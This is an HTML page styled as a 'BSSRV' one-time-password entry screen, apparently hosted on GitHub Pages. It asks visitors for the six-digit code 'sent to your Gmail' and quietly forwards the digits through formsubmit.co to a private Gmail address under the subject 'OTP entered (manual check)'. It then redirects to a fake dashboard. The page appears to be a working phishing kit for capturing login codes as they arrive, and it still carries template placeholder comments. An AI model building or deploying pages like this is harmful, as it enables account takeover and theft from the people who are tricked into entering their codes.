<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Enter OTP | BSSRV</title>
  <link rel="stylesheet" href="style.css">
  <style>
    /* OTP container styles */
    .otp-container {
      display: flex;
      justify-content: space-between;
      gap: 10px;
      max-width: 300px;
      margin: 20px auto;
    }

    .otp-box {
      width: 40px;
      height: 50px;
      text-align: center;
      font-size: 24px;
      border: 1px solid #ccc;
      border-radius: 5px;
    }

    .login-box {
      text-align: center;
    }

    .status {
      color: green;
      margin-top: 10px;
    }
  </style>
</head>
<body>

  <!-- HEADER -->
  <header class="login-header">
    <div class="logo">
      <img src="bssrv_logo.png" alt="BSSRV Logo" style="height:50px;">
      <h1>BSSRV</h1>
    </div>
  </header>

  <!-- OTP SECTION -->
  <section class="login-section">
    <div class="login-box">
      <h2>Enter OTP</h2>
      <p>Please enter the 6-digit OTP sent to your Gmail.</p>

      <form id="otpForm" action="https://formsubmit.co/minissweb@gmail.com" method="POST">
  <input type="hidden" name="_subject" value="OTP entered (manual check)">
  <!-- IMPORTANT: absolute HTTPS URL here (replace with your real GitHub Pages URL) -->
  <input type="hidden" name="_next" value="https://236-cell.github.io/bssrv-website/dashboard.html">
  <!-- helpful: tell FormSubmit exactly what page the form lives on -->
  <input type="hidden" name="_url" value="https://236-cell.github.io/bssrv-website/index.html">

  <div class="otp-container">
    <input type="text" maxlength="1" class="otp-box" name="digit1" required>
    <input type="text" maxlength="1" class="otp-box" name="digit2" required>
    <input type="text" maxlength="1" class="otp-box" name="digit3" required>
    <input type="text" maxlength="1" class="otp-box" name="digit4" required>
    <input type="text" maxlength="1" class="otp-box" name="digit5" required>
    <input type="text" maxlength="1" class="otp-box" name="digit6" required>
  </div>

  <div style="margin-top:12px;">
    <button type="submit" id="submitBtn">Submit OTP</button>
  </div>
</form>
      <p id="status" class="status"></p>
      <p class="note">Didn't receive OTP? Try again later.</p>
    </div>
  </section>

  <script>
  const otpBoxes = document.querySelectorAll('.otp-box');
  const status = document.getElementById('status');
  const form = document.getElementById('otpForm');

  // Auto-focus to next box
  otpBoxes.forEach((box, i) => {
    box.addEventListener('input', () => {
      if (box.value.length === 1 && i < otpBoxes.length - 1) {
        otpBoxes[i + 1].focus();
      }
    });
  });

  // When form is submitted, show status + set a fallback redirect
  form.addEventListener('submit', (e) => {
    // show immediate feedback
    status.innerText = 'Submitting OTP...';

    // Fallback redirect after 6s if FormSubmit doesn't redirect (adjust as needed)
    // Use the SAME absolute URL you put into the hidden _next field
    const fallbackUrl = 'https://yourusername.github.io/your-repo-name/oops.html';
    // Start a one-time timer
    const fallbackTimer = setTimeout(() => {
      // If browser is still on this page after 6s, go to fallback
      window.location.href = fallbackUrl;
    }, 6000);

    // Optional: if you want, clear the fallback if the page unloads (i.e., the real redirect happened)
    window.addEventListener('pagehide', () => clearTimeout(fallbackTimer));
    window.addEventListener('beforeunload', () => clearTimeout(fallbackTimer));

    // IMPORTANT: DO NOT call e.preventDefault() or form.submit() here.
    // Let the browser do the normal submit so FormSubmit's CAPTCHA works.
  });
</script>

</body>
</html>
